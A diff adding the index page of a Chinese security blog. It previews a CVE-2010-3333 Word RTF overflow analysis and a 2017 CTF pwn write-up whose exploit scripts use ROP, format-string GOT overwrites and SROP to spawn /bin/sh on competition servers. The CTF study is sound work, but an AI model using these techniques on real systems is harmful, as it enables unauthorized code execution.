@@ -1,0 +1,1263 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <link rel="dns-prefetch" href="http://reehy.top">
+  <title>Ree</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="另一个的隐秘角落">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Ree">
+<meta property="og:url" content="http://reehy.top/index.html">
+<meta property="og:site_name" content="Ree">
+<meta property="og:description" content="另一个的隐秘角落">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Ree">
+<meta name="twitter:description" content="另一个的隐秘角落">
+  
+    <link rel="alternative" href="/atom.xml" title="Ree" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" type="text/css" href="/./main.2d7529.css">
+  <style type="text/css">
+  
+    #container.show {
+      background: linear-gradient(200deg,#a0cfe4,#e8c37e);
+    }
+  </style>
+  
+
+  
+
+</head>
+
+<body>
+  <div id="container" q-class="show:isCtnShow">
+    <canvas id="anm-canvas" class="anm-canvas"></canvas>
+    <div class="left-col" q-class="show:isShow">
+      
+<div class="overlay" style="background: #575B5F"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			<img src="/img/me.jpg" class="js-avatar">
+		</a>
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Ree He</a></h1>
+		</hgroup>
+		
+		<p class="header-subtitle">做一些微不足道的贡献。</p>
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+				<li><a href="/tags/PWN/">PWN</a></li>
+	        
+				<li><a href="/tags/PAT/">PAT</a></li>
+	        
+				<li><a href="/2017/02/17/C-STL使用目录/">STL</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+    		
+    			
+    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
+    			
+            
+    			
+    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
+    			
+            
+    			
+    			<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="github" target="_blank" href="https://github.com/heyuanree" title="github"><i class="icon-github"></i></a>
+		        
+					<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
+		        
+					<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/ree-96/activities" title="zhihu"><i class="icon-zhihu"></i></a>
+		        
+					<a class="mail" target="_blank" href="mailto:heyuanree@gmail.com" title="mail"><i class="icon-mail"></i></a>
+		        
+					<a class="google" target="_blank" href="/heyuanree@gmail.com" title="google"><i class="icon-google"></i></a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
+      
+<nav id="mobile-nav">
+  	<div class="overlay js-overlay" style="background: #575B5F"></div>
+	<div class="btnctn js-mobile-btnctn">
+  		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
+	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img src="/img/me.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author js-header-author">Ree He</h1>
+			</hgroup>
+			
+			<p class="header-subtitle"><i class="icon icon-quo-left"></i>做一些微不足道的贡献。<i class="icon icon-quo-right"></i></p>
+			
+			
+			
+				
+			
+				
+			
+				
+			
+				
+			
+			
+			
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/heyuanree" title="github"><i class="icon-github"></i></a>
+			        
+						<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
+			        
+						<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/ree-96/activities" title="zhihu"><i class="icon-zhihu"></i></a>
+			        
+						<a class="mail" target="_blank" href="mailto:heyuanree@gmail.com" title="mail"><i class="icon-mail"></i></a>
+			        
+						<a class="google" target="_blank" href="/heyuanree@gmail.com" title="google"><i class="icon-google"></i></a>
+			        
+				</div>
+			</nav>
+
+			<nav class="header-menu js-header-menu">
+				<ul style="width: 70%">
+				
+				
+					<li style="width: 25%"><a href="/">主页</a></li>
+		        
+					<li style="width: 25%"><a href="/tags/PWN/">PWN</a></li>
+		        
+					<li style="width: 25%"><a href="/tags/PAT/">PAT</a></li>
+		        
+					<li style="width: 25%"><a href="/2017/02/17/C-STL使用目录/">STL</a></li>
+		        
+				</ul>
+			</nav>
+		</header>				
+	</div>
+	<div class="mobile-mask" style="display:none" q-show="isShow"></div>
+</nav>
+
+      <div id="wrapper" class="body-wrap">
+        <div class="menu-l">
+          <div class="canvas-wrap">
+            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
+          </div>
+          <div id="js-content" class="content-ll">
+            
+  
+    <article id="post-glibc-heap导图" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/14/glibc-heap导图/">glibc-heap导图</a>
+    </h1>
+  
+
+        
+        <a href="/2017/05/14/glibc-heap导图/" class="archive-article-date">
+  	<time datetime="2017-05-14T12:16:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="/2017/05/14/glibc-heap导图/heap.png" alt="heap"></p>
+<p><a href="http://blog.a7vinx.me/" target="_blank" rel="external">img from</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">heap</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/05/14/glibc-heap导图/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-CVE-2010-3333" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/10/CVE-2010-3333/">CVE-2010-3333</a>
+    </h1>
+  
+
+        
+        <a href="/2017/05/10/CVE-2010-3333/" class="archive-article-date">
+  	<time datetime="2017-05-09T16:04:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>2017SSCTF中遇到，顺便学习，第一次接触CVE和win的漏洞。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>win7 sp1 简体中文<br>word2003简体中文</p>
+<h2 id="crash分析"><a href="#crash分析" class="headerlink" title="crash分析"></a>crash分析</h2><p>这个漏洞就是一个单纯栈溢出漏洞。<br>先从一个crash样本开始。样本按照《漏洞战争》说明生成即可。</p>
+<p>首先已经知道出问题的地方在rtf文档的画图属性，由于没有正确计算参数的长度，导致strcpy的时候产生了溢出。<br>先查看crash文档的内容。</p>
+<p><img src="/2017/05/10/CVE-2010-3333/1.png" alt="1"></p>
+<p>发现在一定长度后填充的大量的字符串。<br>windbg附加到word上，查看崩溃现场。</p>
+<p><img src="/2017/05/10/CVE-2010-3333/2.png" alt="2"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CVE</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Win</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/05/10/CVE-2010-3333/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-2017广东红帽pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/09/2017广东红帽pwn/">2017广东红帽pwn</a>
+    </h1>
+  
+
+        
+        <a href="/2017/05/09/2017广东红帽pwn/" class="archive-article-date">
+  	<time datetime="2017-05-09T14:13:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>第一次ak，记录下。不过主要因为题目很简单。</p>
+<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>栈溢出，<code>system</code>已经有了，用rop在.rodata段上写/bin/sh，然后调用system即可。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">0</span></div><div class="line"><span class="built_in">local</span> = <span class="number">0</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="built_in">global</span> p</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="keyword">if</span> <span class="built_in">local</span>:</div><div class="line">    p = <span class="built_in">process</span>(<span class="string">'./pwn1'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(<span class="string">'106.75.93.221'</span>,<span class="number">10000</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="built_in">local</span> <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, <span class="built_in">open</span>(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn1'</span>)</div><div class="line">system_plt = elf.symbols[<span class="string">'system'</span>]</div><div class="line">scanf_addr = elf.symbols[<span class="string">'__isoc99_scanf'</span>]</div><div class="line">bss = elf.bss</div><div class="line">main = <span class="number">0x08048531</span></div><div class="line">ppr = <span class="number">0x080485ee</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="built_in">offset</span> = <span class="number">52</span></div><div class="line"></div><div class="line">def pwn():</div><div class="line">    payload = cyclic(<span class="built_in">offset</span>) + p32(scanf_addr) + p32(main) + p32(<span class="number">0x08049629</span>) + p32(<span class="number">0x0804A028</span>)</div><div class="line">    payload1 = cyclic(<span class="number">44</span>) + p32(system_plt) + p32(<span class="number">1234</span>) + p32(<span class="number">0x0804a028</span>)</div><div class="line">    p.recvuntil(<span class="string">'test'</span>)</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    p.sendline(payload)</div><div class="line">    p.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line">    p.sendline(payload1)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
+<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>格式化字符串漏洞。先泄露<code>__libc_start_main+246</code>的地址，然后将<code>printf</code>的got改成system。问题是我们没有libc。libc的信息是第一题的shell中得到的，用<br><code>readelf -a libc-2.12 | grep __libc_start_main</code>和<code>readelf -a libc-2.12 | grep system</code><br>得到libc中函数的偏移再计算即可。其中要注意libc的页对齐。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">1</span></div><div class="line"><span class="keyword">local</span> = <span class="number">0</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line">global p</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="keyword">if</span> <span class="keyword">local</span>:</div><div class="line">    p = process(<span class="string">'./pwn2'</span>)</div><div class="line">    libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(<span class="string">'106.75.93.221'</span>,<span class="number">20002</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="keyword">local</span> <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, <span class="keyword">open</span>(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn2'</span>)</div><div class="line">printf_got = elf.got[<span class="string">'printf'</span>]</div><div class="line"></div><div class="line">def leak(payload):</div><div class="line">    p = process(<span class="string">'./pwn2'</span>)</div><div class="line">    p.sendline(payload)</div><div class="line">    <span class="keyword">return</span> p.recvall(<span class="number">0</span>.<span class="number">1</span>)</div><div class="line"></div><div class="line">def pwn():</div><div class="line"><span class="comment"># 7611: 00016c40   437 FUNC    GLOBAL DEFAULT   12 __libc_start_main</span></div><div class="line"><span class="comment"># 6733: 0003ae80   125 FUNC    WEAK   DEFAULT   12 system</span></div><div class="line">    payload = <span class="string">'%267$x'</span></div><div class="line">    p.sendline(payload)</div><div class="line">    leak_addr = <span class="keyword">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">'__libc_start_main =&gt; '</span>, <span class="keyword">hex</span>(leak_addr)</div><div class="line">    libc_address = leak_addr - <span class="number">0x0016c30</span> - <span class="number">246</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'libc_address =&gt; '</span>, <span class="keyword">hex</span>(libc_address)</div><div class="line"></div><div class="line"><span class="comment">#    fmt = FmtStr(leak)</span></div><div class="line"><span class="comment">#    print 'offset =&gt; ', fmt.offset</span></div><div class="line"></div><div class="line">    system_addr = libc_address + <span class="number">0x0003ae80</span></div><div class="line">    <span class="keyword">write</span> = &#123;printf_got:system_addr&#125;</div><div class="line">    payload = fmtstr_payload(<span class="number">7</span>, <span class="keyword">write</span>, <span class="number">0</span>, <span class="string">'byte'</span>)</div><div class="line"><span class="comment">#    payload = fmtstr_payload(fmt.offset, write, 0, 'byte')</span></div><div class="line">    p.sendline(payload)</div><div class="line">    p.sendline(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
+<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>logo函数中会把ebp-0x1c的位置填充为0xdadadada，这样当我们一开始输入id长度为8时最后的\x00就会被覆盖，这样在update id的时候strlen函数就会把0xdadadada以及下面的name的堆指针给计算进去，我们修改id的时候就能修改到name指针。这样我们就存在了任意地址读和写。</p>
+<p>将name指针改为atoi_got，print name得到libc地址，将其修改为system地址传入/bin/sh即可。同样的，偏移在pwn1的shell中得到。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">slog = <span class="number">0</span></div><div class="line">local = <span class="number">0</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">global</span> p</div><div class="line"><span class="keyword">global</span> libc</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeio</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> local:</div><div class="line">        p = process(<span class="string">'./pwn3'</span>)</div><div class="line">        libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        p = remote(<span class="string">'106.75.93.221'</span>,<span class="number">10002</span>)</div><div class="line">        libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</div><div class="line">    <span class="keyword">return</span> p, libc</div><div class="line"></div><div class="line"><span class="keyword">if</span> local <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, open(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn3'</span>)</div><div class="line">printf_got = elf.got[<span class="string">'printf'</span>]</div><div class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</div><div class="line">fgets_got = elf.got[<span class="string">'fgets'</span>]</div><div class="line">stdout = <span class="number">0x0804A060</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upid</span><span class="params">(payload)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'=&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.recvuntil(<span class="string">'ID.'</span>)</div><div class="line">    payload = <span class="string">'123456781234'</span>+payload</div><div class="line">    p.sendline(payload.ljust(<span class="number">0x15</span>, <span class="string">'1'</span>))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">printname</span><span class="params">()</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'=&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'4'</span>)</div><div class="line">    p.recvuntil(<span class="string">'name:'</span>)</div><div class="line">    p.recv(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">printlogo</span><span class="params">()</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'=&gt;'</span>)</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    p.sendline(<span class="string">'5'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upmem</span><span class="params">(num)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'=&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'2'</span>)</div><div class="line">    p.sendline(str(num))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upname</span><span class="params">(payload)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'=&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div class="line">    p.send(payload)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">    upid(p32(address))</div><div class="line">    printname()</div><div class="line">    data = p.recv(<span class="number">4</span>)</div><div class="line">    log.info(<span class="string">"%#x =&gt; %s"</span> % (address, data))</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(p)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'id'</span>)</div><div class="line">    p.send(<span class="string">'12345678'</span>)</div><div class="line">    printlogo()</div><div class="line"></div><div class="line"><span class="comment">#    d = DynELF(leak, elf=ELF('./pwn3'))</span></div><div class="line"><span class="comment">#    system_addr = d.lookup('system', 'libc')</span></div><div class="line"><span class="comment">#    print system_addr</span></div><div class="line"></div><div class="line">    upid(p32(atoi_got))</div><div class="line">    printname()</div><div class="line">    atoi_addr = u32(p.recv(<span class="number">4</span>)) - <span class="number">0xa000000</span></div><div class="line">    <span class="keyword">print</span> hex(atoi_addr)</div><div class="line"></div><div class="line">    </div><div class="line">    upid(p32(fgets_got))</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    printname()</div><div class="line">    <span class="keyword">print</span> hex(u32(p.recv(<span class="number">4</span>)))</div><div class="line">    <span class="keyword">print</span> <span class="string">'atoi_addr =&gt; '</span>, hex(atoi_addr) </div><div class="line"></div><div class="line"><span class="comment">#    libc.address = atoi_addr - libc.symbols['atoi']</span></div><div class="line"><span class="comment">#    print 'libc.address =&gt; ', hex(libc.address)</span></div><div class="line"><span class="comment">#    system_addr = libc.symbols['system']</span></div><div class="line"><span class="comment">#    print 'dis libc =&gt; ', hex(atoi_addr - libc.address)</span></div><div class="line"></div><div class="line"><span class="comment">#    print 'distance', hex(system_addr - atoi_addr)</span></div><div class="line">    </div><div class="line">    system_addr = atoi_addr + <span class="number">0xf030</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'system =&gt; '</span>, hex(system_addr)</div><div class="line">    upmem(<span class="number">5</span>)</div><div class="line">    upname(p32(system_addr))</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    p.recvuntil(<span class="string">'=&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    p,libc = makeio()</div><div class="line">    pwn(p)</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
+<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>360春秋杯，原题，SROP不说了。。。因为是centos，还要爆破下偏移，感谢小伙伴@Inj3ct0r的偏移计算。<br>当初写的脚本找不到了，网上找了一个。</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*-coding:utf-8-*-</span></div><div class="line"><span class="attr">__author__</span> = 'joker'</div><div class="line">from pwn <span class="built_in">import</span> *</div><div class="line">context.<span class="attr">log_level</span> = <span class="string">"debug"</span></div><div class="line">context.<span class="attr">arch</span> = <span class="string">"amd64"</span></div><div class="line"><span class="comment">#r = process("./pwn4")</span></div><div class="line"><span class="attr">r</span> = remote('<span class="number">106.75</span>.<span class="number">66.195</span>', <span class="number">11006</span>)</div><div class="line"><span class="attr">syscall_addr</span> = <span class="number">0</span>x4000BE</div><div class="line"><span class="attr">start_addr</span> = <span class="number">0</span>x4000B0</div><div class="line"><span class="attr">payload</span> = p64(start_addr)</div><div class="line">payload += p64(start_addr)<span class="comment">#fill</span></div><div class="line">payload += p64(start_addr)<span class="comment">#fill</span></div><div class="line">r.send(payload)</div><div class="line"><span class="comment">#write infor leak</span></div><div class="line">r.send(<span class="string">"\xb3"</span>)<span class="comment">#write 2 start_addr last byte</span></div><div class="line"><span class="attr">data</span> = r.recv(<span class="number">8</span>)</div><div class="line"><span class="attr">data</span> = r.recv(<span class="number">8</span>)</div><div class="line"><span class="attr">stack_addr</span> = u64(data) - <span class="number">0</span>xa00</div><div class="line">print <span class="string">"[*]:stack:&#123;0&#125;"</span>.format(hex(stack_addr))</div><div class="line"><span class="attr">frame</span> = SigreturnFrame()</div><div class="line">frame.<span class="attr">rax</span> = constants.SYS_read</div><div class="line">frame.<span class="attr">rdi</span> = <span class="number">0</span></div><div class="line">frame.<span class="attr">rsi</span> = stack_addr</div><div class="line">frame.<span class="attr">rdx</span> = <span class="number">0</span>x300</div><div class="line">frame.<span class="attr">rsp</span> = stack_addr</div><div class="line">frame.<span class="attr">rip</span> = syscall_addr</div><div class="line"><span class="attr">payload</span> = p64(start_addr)</div><div class="line">payload += p64(syscall_addr)</div><div class="line">payload += str(frame)</div><div class="line">r.send(payload)</div><div class="line"><span class="attr">payload</span> = p64(<span class="number">0</span>x4000B3)<span class="comment">#fill</span></div><div class="line">payload += p64(<span class="number">0</span>x4000B3)<span class="comment">#fill</span></div><div class="line"><span class="attr">payload</span> = payload[:<span class="number">15</span>]</div><div class="line">r.send(payload)<span class="comment">#set rax=sys_rt_sigreturn</span></div><div class="line"><span class="attr">frame</span> = SigreturnFrame()</div><div class="line">frame.<span class="attr">rax</span> = constants.SYS_mprotect</div><div class="line">frame.<span class="attr">rdi</span> = (stack_addr&amp;<span class="number">0</span>xfffffffffffff000)</div><div class="line">frame.<span class="attr">rsi</span> = <span class="number">0</span>x1000</div><div class="line">frame.<span class="attr">rdx</span> = <span class="number">0</span>x7</div><div class="line">frame.<span class="attr">rsp</span> = stack_addr + <span class="number">0</span>x108</div><div class="line">frame.<span class="attr">rip</span> = syscall_addr</div><div class="line"><span class="attr">payload</span> = p64(start_addr)</div><div class="line">payload += p64(syscall_addr)</div><div class="line">payload += str(frame)</div><div class="line">payload += p64(stack_addr + <span class="number">0</span>x108 + <span class="number">8</span>)</div><div class="line"><span class="comment">#payload += cyclic(0x100)#addr ====&gt; start_addr + 0x108</span></div><div class="line">payload += <span 